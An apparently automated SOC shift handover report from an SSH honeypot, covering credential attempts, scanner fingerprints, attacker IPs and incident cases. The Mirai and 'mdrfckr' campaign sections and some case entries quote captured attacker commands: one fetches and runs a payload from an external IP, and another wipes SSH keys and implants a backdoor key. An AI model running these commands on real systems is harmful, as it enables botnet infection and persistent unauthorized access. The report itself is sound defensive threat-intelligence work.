# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-19 |
| **Generated At** | 2026-08-19T10:34:24Z |
| **Shift Time** | 10:34 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **814** |
| Confirmed Threats | **794** |
| False Positives Filtered | **20** (2.5%) |
| Unique Attacker IPs | **82** |
| Countries of Origin | **31** |
| High Severity Cases | **75** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **739** |
| Malware Samples Analyzed | **2** HIGH · **22** MED · 20 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **98** |
| Unique Credential Pairs | **54** |
| Unique Usernames | **15** |
| Unique Passwords | **49** |
| Successful Auth Pairs | **85** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 32 |
| `default` | 22 |
| `blank` | 6 |
| `admin` | 6 |
| `guest` | 6 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `blank2022` | 6 |
| `admin2024` | 6 |
| `guest2019` | 6 |
| `123456` | 5 |
| `default2022` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `blank` | `blank2022` | 6 |
| `admin` | `admin2024` | 6 |
| `guest` | `guest2019` | 6 |
| `default` | `default2022` | 5 |
| `ubnt` | `ubnt2002` | 5 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `user` | `85.158.145.129` | 2026-08-19T06:57:27 |
| `root` | `﻿------fuck------` | `10.0.0.73` | 2026-08-19T06:59:03 |
| `unknown` | `123654` | `185.112.148.66` | 2026-08-19T06:59:28 |
| `default` | `password` | `10.0.0.73` | 2026-08-19T07:02:59 |
| `root` | `user0` | `85.158.145.129` | 2026-08-19T07:03:23 |
| `blank` | `blank2022` | `62.122.195.14` | 2026-08-19T07:04:29 |
| `default` | `password` | `192.72.56.178` | 2026-08-19T07:04:39 |
| `blank` | `blank2022` | `49.124.151.52` | 2026-08-19T07:04:46 |
| `default` | `password` | `118.183.180.108` | 2026-08-19T07:04:52 |
| `root` | `﻿00099` | `110.173.190.221` | 2026-08-19T07:07:00 |
| `default` | `default2020` | `46.101.9.55` | 2026-08-19T07:08:04 |
| `default` | `default2020` | `176.170.1.244` | 2026-08-19T07:08:26 |
| `root` | `admin` | `45.198.224.26` | 2026-08-19T07:08:37 |
| `root` | `user1` | `85.158.145.129` | 2026-08-19T07:09:19 |
| `foundry` | `123456` | `218.78.132.164` | 2026-08-19T07:13:35 |
| `foundry` | `3245gs5662d34` | `218.78.132.164` | 2026-08-19T07:13:48 |
| `root` | `user0123` | `85.158.145.129` | 2026-08-19T07:15:15 |
| `blank` | `blank2022` | `10.0.0.73` | 2026-08-19T07:16:04 |
| `root` | `0001` | `110.173.190.221` | 2026-08-19T07:19:21 |
| `support` | `support` | `176.53.159.196` | 2026-08-19T07:19:58 |
| `root` | `user12` | `85.158.145.129` | 2026-08-19T07:21:12 |
| `default` | `default2022` | `10.0.0.73` | 2026-08-19T07:23:10 |
| `user` | `user` | `77.90.185.20` | 2026-08-19T07:24:23 |
| `root` | `user123` | `85.158.145.129` | 2026-08-19T07:27:08 |
| `root` | `0002` | `110.173.190.221` | 2026-08-19T07:31:39 |
| `root` | `user1234` | `85.158.145.129` | 2026-08-19T07:33:04 |
| `blank` | `blank2022` | `65.20.251.41` | 2026-08-19T07:33:09 |
| `blank` | `blank2022` | `194.31.8.12` | 2026-08-19T07:33:17 |
| `ubnt` | `ubnt2002` | `65.20.237.119` | 2026-08-19T07:38:26 |
| `ubnt` | `ubnt2002` | `36.92.35.211` | 2026-08-19T07:38:36 |
| `root` | `user12345` | `85.158.145.129` | 2026-08-19T07:39:01 |
| `default` | `default2022` | `65.20.153.146` | 2026-08-19T07:41:13 |
| `default` | `default2022` | `60.166.8.174` | 2026-08-19T07:41:22 |
| `default` | `default2022` | `107.135.117.245` | 2026-08-19T07:41:25 |
| `default` | `default2022` | `213.33.204.130` | 2026-08-19T07:41:34 |
| `root` | `0003` | `110.173.190.221` | 2026-08-19T07:43:56 |
| `support` | `support` | `10.0.0.73` | 2026-08-19T07:44:51 |
| `root` | `user123456` | `85.158.145.129` | 2026-08-19T07:44:58 |
| `pi` | `abcd1234` | `10.0.0.73` | 2026-08-19T07:49:12 |
| `ubnt` | `ubnt2002` | `10.0.0.73` | 2026-08-19T07:49:58 |
| `root` | `user1234567` | `85.158.145.129` | 2026-08-19T07:50:54 |
| `root` | `0004` | `110.173.190.221` | 2026-08-19T07:56:06 |
| `admin` | `admin2024` | `10.0.0.73` | 2026-08-19T07:56:49 |
| `root` | `user12345678` | `85.158.145.129` | 2026-08-19T07:56:51 |
| `root` | `user123456789` | `85.158.145.129` | 2026-08-19T08:02:47 |
| `ubnt` | `ubnt2002` | `35.130.111.146` | 2026-08-19T08:07:00 |
| `ubnt` | `ubnt2002` | `60.220.241.50` | 2026-08-19T08:07:11 |
| `root` | `0005` | `110.173.190.221` | 2026-08-19T08:08:27 |
| `root` | `user1234567890` | `85.158.145.129` | 2026-08-19T08:08:44 |
| `default` | `1234567890` | `10.0.0.73` | 2026-08-19T08:10:43 |
| `root` | `<Any pass>` | `158.69.60.127` | 2026-08-19T08:10:55 |
| `guest` | `guest2019` | `124.133.10.66` | 2026-08-19T08:12:18 |
| `default` | `1234567890` | `121.189.226.81` | 2026-08-19T08:12:22 |
| `default` | `1234567890` | `195.222.57.190` | 2026-08-19T08:12:29 |
| `guest` | `guest2019` | `103.120.116.162` | 2026-08-19T08:12:32 |
| `root` | `zaq!xsw@` | `85.158.145.129` | 2026-08-19T08:14:40 |
| `admin` | `admin2024` | `196.189.124.218` | 2026-08-19T08:14:56 |
| `admin` | `admin2024` | `66.45.144.201` | 2026-08-19T08:15:03 |
| `admin` | `admin2024` | `186.103.136.43` | 2026-08-19T08:15:11 |
| `admin` | `admin2024` | `183.104.220.84` | 2026-08-19T08:15:20 |
| `root` | `zaq12wsxcd` | `85.158.145.129` | 2026-08-19T08:20:36 |
| `root` | `0006` | `110.173.190.221` | 2026-08-19T08:20:52 |
| `guest` | `guest2019` | `10.0.0.73` | 2026-08-19T08:23:44 |
| `test` | `88888888` | `203.145.143.163` | 2026-08-19T08:26:28 |
| `345gs5662d34` | `345gs5662d34` | `203.145.143.163` | 2026-08-19T08:26:33 |
| `root` | `zaq1xsw2` | `85.158.145.129` | 2026-08-19T08:26:33 |
| `test` | `3245gs5662d34` | `203.145.143.163` | 2026-08-19T08:26:35 |
| `default` | `123456` | `10.0.0.73` | 2026-08-19T08:30:11 |
| `root` | `zaq1xsw2cd` | `85.158.145.129` | 2026-08-19T08:32:29 |
| `root` | `0007` | `110.173.190.221` | 2026-08-19T08:33:18 |
| `root` | `zaqxsw` | `85.158.145.129` | 2026-08-19T08:38:26 |
| `User` | `123456` | `159.65.2.17` | 2026-08-19T08:40:22 |
| `345gs5662d34` | `345gs5662d34` | `159.65.2.17` | 2026-08-19T08:40:26 |
| `User` | `3245gs5662d34` | `159.65.2.17` | 2026-08-19T08:40:28 |
| `guest` | `guest2019` | `122.187.229.220` | 2026-08-19T08:40:53 |
| `guest` | `guest2019` | `209.173.10.75` | 2026-08-19T08:41:06 |
| `root` | `112233` | `85.158.145.129` | 2026-08-19T08:44:23 |
| `default` | `default2019` | `10.0.0.73` | 2026-08-19T08:44:31 |
| `root` | `0008` | `110.173.190.221` | 2026-08-19T08:45:37 |
| `centos` | `centos2023` | `114.30.223.119` | 2026-08-19T08:45:55 |
| `centos` | `centos2023` | `187.126.105.42` | 2026-08-19T08:46:05 |
| `default` | `default2019` | `210.177.143.61` | 2026-08-19T08:46:10 |
| `default` | `default2019` | `65.20.175.6` | 2026-08-19T08:46:26 |
| `default` | `123456` | `69.126.144.30` | 2026-08-19T08:48:46 |
| `root` | `!@#123` | `85.158.145.129` | 2026-08-19T08:50:19 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **814** |
| Sessions with Fingerprint | **12** |
| Unique HASSH Fingerprints | **12** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 35 |
| OpenSSH | 33 |
| libssh | 14 |
| PuTTY | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 32 | 32 |
| `98f63c4d9c87...` | Generic scanner | 20 | 1 |
| `98ddc5604ef6...` | Modern SSH client | 9 | 1 |
| `03a80b21afa8...` | Modern SSH client | 5 | 2 |
| `16443846184e...` | Generic scanner | 3 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 32 | 32 | Mirai/variant |
| `98f63c4d9c87...` | Go SSH scanner | 20 | 1 | Generic scanner |
| `98ddc5604ef6...` | Go SSH scanner | 9 | 1 | Modern SSH client |
| `95420f9d932d...` | libssh | 5 | 2 | — |
| `03a80b21afa8...` | libssh | 5 | 2 | Modern SSH client |
| `16443846184e...` | Go SSH scanner | 3 | 2 | Generic scanner |
| `f555226df196...` | libssh | 3 | 1 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **5** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1070, T1140, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 3 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
(cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/dev/null 2>&1 &
```
```
cd /tmp
```
```
wget http://5.182.210.174/ok
```
```
curl -O http://5.182.210.174/ok
```
```
chmod +x ok
```
Source IPs: `45.198.224.26`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `218.78.132.164`, `159.65.2.17`, `203.145.143.163`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **82** |
| Unique ASNs | **56** |
| High-Risk ASNs | **47** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS398324` | Censys, Inc. | 7 | HIGH |
| `AS63949` | Akamai Connected Cloud | 5 | HIGH |
| `AS203214` | Hulum Almustakbal Company for Communication Engineering and Services Ltd | 4 | HIGH |
| `AS14061` | DigitalOcean, LLC | 4 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 3 | HIGH |
| `AS4134` | CHINANET BACKBONE | 3 | HIGH |
| `AS20115` | Charter Communications LLC | 2 | HIGH |
| `AS10617` | SION S.A | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (75)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-a0b16035faa1

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 06:57 |
| **Last Seen** | 2026-08-19 06:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 06:57:26` | `cowrie.session.connect` |
| `2026-08-19 06:57:26` | `cowrie.client.version` |
| `2026-08-19 06:57:26` | `cowrie.client.kex` |
| `2026-08-19 06:57:27` | `cowrie.login.success` |
| `2026-08-19 06:57:27` | `cowrie.session.params` |
| `2026-08-19 06:57:27` | `cowrie.command.input` |
| `2026-08-19 06:57:28` | `cowrie.log.closed` |
| `2026-08-19 06:57:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd1ea27190f3

| Field | Detail |
|---|---|
| **Source IP** | `185.112.148[.]66` |
| **First Seen** | 2026-08-19 06:59 |
| **Last Seen** | 2026-08-19 06:59 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 06:59:25` | `cowrie.session.connect` |
| `2026-08-19 06:59:27` | `cowrie.client.version` |
| `2026-08-19 06:59:27` | `cowrie.client.kex` |
| `2026-08-19 06:59:28` | `cowrie.login.success` |
| `2026-08-19 06:59:29` | `cowrie.direct-tcpip.request` |
| `2026-08-19 06:59:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.148[.]66` to AbuseIPDB if not already reported
- [ ] Block `185.112.148[.]66` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e09dcd34e2ea

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 07:03 |
| **Last Seen** | 2026-08-19 07:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 07:03:23` | `cowrie.session.connect` |
| `2026-08-19 07:03:23` | `cowrie.client.version` |
| `2026-08-19 07:03:23` | `cowrie.client.kex` |
| `2026-08-19 07:03:23` | `cowrie.login.success` |
| `2026-08-19 07:03:24` | `cowrie.session.params` |
| `2026-08-19 07:03:24` | `cowrie.command.input` |
| `2026-08-19 07:03:24` | `cowrie.log.closed` |
| `2026-08-19 07:03:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62b1cfd6b1e3

| Field | Detail |
|---|---|
| **Source IP** | `62.122.195[.]14` |
| **First Seen** | 2026-08-19 07:04 |
| **Last Seen** | 2026-08-19 07:04 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 07:04:28` | `cowrie.session.connect` |
| `2026-08-19 07:04:28` | `cowrie.client.version` |
| `2026-08-19 07:04:28` | `cowrie.client.kex` |
| `2026-08-19 07:04:29` | `cowrie.login.success` |
| `2026-08-19 07:04:30` | `cowrie.direct-tcpip.request` |
| `2026-08-19 07:04:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.122.195[.]14` to AbuseIPDB if not already reported
- [ ] Block `62.122.195[.]14` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0573ea799654

| Field | Detail |
|---|---|
| **Source IP** | `192.72.56[.]178` |
| **First Seen** | 2026-08-19 07:04 |
| **Last Seen** | 2026-08-19 07:04 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 07:04:37` | `cowrie.session.connect` |
| `2026-08-19 07:04:37` | `cowrie.client.version` |
| `2026-08-19 07:04:37` | `cowrie.client.kex` |
| `2026-08-19 07:04:39` | `cowrie.login.success` |
| `2026-08-19 07:04:40` | `cowrie.direct-tcpip.request` |
| `2026-08-19 07:04:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `192.72.56[.]178` to AbuseIPDB if not already reported
- [ ] Block `192.72.56[.]178` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-813a753540dc

| Field | Detail |
|---|---|
| **Source IP** | `49.124.151[.]52` |
| **First Seen** | 2026-08-19 07:04 |
| **Last Seen** | 2026-08-19 07:04 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 07:04:42` | `cowrie.session.connect` |
| `2026-08-19 07:04:42` | `cowrie.client.version` |
| `2026-08-19 07:04:42` | `cowrie.client.kex` |
| `2026-08-19 07:04:46` | `cowrie.login.success` |
| `2026-08-19 07:04:47` | `cowrie.direct-tcpip.request` |
| `2026-08-19 07:04:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.151[.]52` to AbuseIPDB if not already reported
- [ ] Block `49.124.151[.]52` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99271be924c4

| Field | Detail |
|---|---|
| **Source IP** | `118.183.180[.]108` |
| **First Seen** | 2026-08-19 07:04 |
| **Last Seen** | 2026-08-19 07:04 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 07:04:50` | `cowrie.session.connect` |
| `2026-08-19 07:04:50` | `cowrie.client.version` |
| `2026-08-19 07:04:50` | `cowrie.client.kex` |
| `2026-08-19 07:04:52` | `cowrie.login.success` |
| `2026-08-19 07:04:54` | `cowrie.direct-tcpip.request` |
| `2026-08-19 07:04:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.183.180[.]108` to AbuseIPDB if not already reported
- [ ] Block `118.183.180[.]108` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61b6ee0a2bed

| Field | Detail |
|---|---|
| **Source IP** | `110.173.190[.]221` |
| **First Seen** | 2026-08-19 07:06 |
| **Last Seen** | 2026-08-19 07:07 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 07:06:51` | `cowrie.session.connect` |
| `2026-08-19 07:06:53` | `cowrie.client.version` |
| `2026-08-19 07:06:53` | `cowrie.client.kex` |
| `2026-08-19 07:07:00` | `cowrie.login.success` |
| `2026-08-19 07:07:05` | `cowrie.session.params` |
| `2026-08-19 07:07:05` | `cowrie.command.input` |
| `2026-08-19 07:07:06` | `cowrie.log.closed` |
| `2026-08-19 07:07:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.173.190[.]221` to AbuseIPDB if not already reported
- [ ] Block `110.173.190[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-628659b40d50

| Field | Detail |
|---|---|
| **Source IP** | `46.101.9[.]55` |
| **First Seen** | 2026-08-19 07:08 |
| **Last Seen** | 2026-08-19 07:08 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 07:08:03` | `cowrie.session.connect` |
| `2026-08-19 07:08:03` | `cowrie.client.version` |
| `2026-08-19 07:08:03` | `cowrie.client.kex` |
| `2026-08-19 07:08:04` | `cowrie.login.success` |
| `2026-08-19 07:08:04` | `cowrie.direct-tcpip.request` |
| `2026-08-19 07:08:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.101.9[.]55` to AbuseIPDB if not already reported
- [ ] Block `46.101.9[.]55` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac46b513c50f

| Field | Detail |
|---|---|
| **Source IP** | `176.170.1[.]244` |
| **First Seen** | 2026-08-19 07:08 |
| **Last Seen** | 2026-08-19 07:08 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 07:08:11` | `cowrie.session.connect` |
| `2026-08-19 07:08:15` | `cowrie.client.version` |
| `2026-08-19 07:08:15` | `cowrie.client.kex` |
| `2026-08-19 07:08:26` | `cowrie.login.success` |
| `2026-08-19 07:08:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.170.1[.]244` to AbuseIPDB if not already reported
- [ ] Block `176.170.1[.]244` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c6b30eb46b8

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]26` |
| **First Seen** | 2026-08-19 07:08 |
| **Last Seen** | 2026-08-19 07:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `(cd /tmp; wget hxxp://5.182.210[.]174/ok; curl -O hxxp://5.182.210[.]174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/dev/null 2>&1 &, cd /tmp, wget hxxp://5.182.210[.]174/ok, curl -O hxxp://5.182.210[.]174/ok, chmod +x ok` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 07:08:37` | `cowrie.session.connect` |
| `2026-08-19 07:08:37` | `cowrie.telnet.option` |
| `2026-08-19 07:08:37` | `cowrie.login.success` |
| `2026-08-19 07:08:37` | `cowrie.session.params` |
| `2026-08-19 07:08:37` | `cowrie.telnet.option` |
| `2026-08-19 07:08:37` | `cowrie.telnet.option` |
| `2026-08-19 07:08:37` | `cowrie.command.input` |
| `2026-08-19 07:08:37` | `cowrie.command.input` |
| `2026-08-19 07:08:37` | `cowrie.command.input` |
| `2026-08-19 07:08:37` | `cowrie.command.input` |
| `2026-08-19 07:08:37` | `cowrie.command.input` |
| `2026-08-19 07:08:37` | `cowrie.command.input` |
| `2026-08-19 07:08:38` | `cowrie.command.input` |
| `2026-08-19 07:08:38` | `cowrie.command.input` |
| `2026-08-19 07:08:38` | `cowrie.command.failed` |
| `2026-08-19 07:08:38` | `cowrie.command.input` |
| `2026-08-19 07:08:38` | `cowrie.command.input` |
| `2026-08-19 07:08:38` | `cowrie.command.input` |
| `2026-08-19 07:08:38` | `cowrie.command.input` |
| `2026-08-19 07:08:38` | `cowrie.command.input` |
| `2026-08-19 07:08:38` | `cowrie.command.input` |
| `2026-08-19 07:08:38` | `cowrie.command.success` |
| `2026-08-19 07:08:38` | `cowrie.command.input` |
| `2026-08-19 07:08:38` | `cowrie.command.input` |
| `2026-08-19 07:08:38` | `cowrie.command.failed` |
| `2026-08-19 07:08:38` | `cowrie.command.input` |
| `2026-08-19 07:08:38` | `cowrie.command.input` |
| `2026-08-19 07:08:38` | `cowrie.command.success` |
| `2026-08-19 07:08:38` | `cowrie.command.input` |
| `2026-08-19 07:08:38` | `cowrie.command.input` |
| `2026-08-19 07:08:38` | `cowrie.command.failed` |
| `2026-08-19 07:08:38` | `cowrie.command.input` |
| `2026-08-19 07:08:38` | `cowrie.command.input` |
| `2026-08-19 07:08:38` | `cowrie.command.success` |
| `2026-08-19 07:08:38` | `cowrie.command.input` |
| `2026-08-19 07:08:38` | `cowrie.command.failed` |
| `2026-08-19 07:08:38` | `cowrie.command.input` |
| `2026-08-19 07:08:38` | `cowrie.log.closed` |
| `2026-08-19 07:08:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c898de986378

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 07:09 |
| **Last Seen** | 2026-08-19 07:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 07:09:19` | `cowrie.session.connect` |
| `2026-08-19 07:09:19` | `cowrie.client.version` |
| `2026-08-19 07:09:19` | `cowrie.client.kex` |
| `2026-08-19 07:09:19` | `cowrie.login.success` |
| `2026-08-19 07:09:20` | `cowrie.session.params` |
| `2026-08-19 07:09:20` | `cowrie.command.input` |
| `2026-08-19 07:09:20` | `cowrie.log.closed` |
| `2026-08-19 07:09:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59b5b9286f31

| Field | Detail |
|---|---|
| **Source IP** | `218.78.132[.]164` |
| **First Seen** | 2026-08-19 07:13 |
| **Last Seen** | 2026-08-19 07:13 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 07:13:34` | `cowrie.session.connect` |
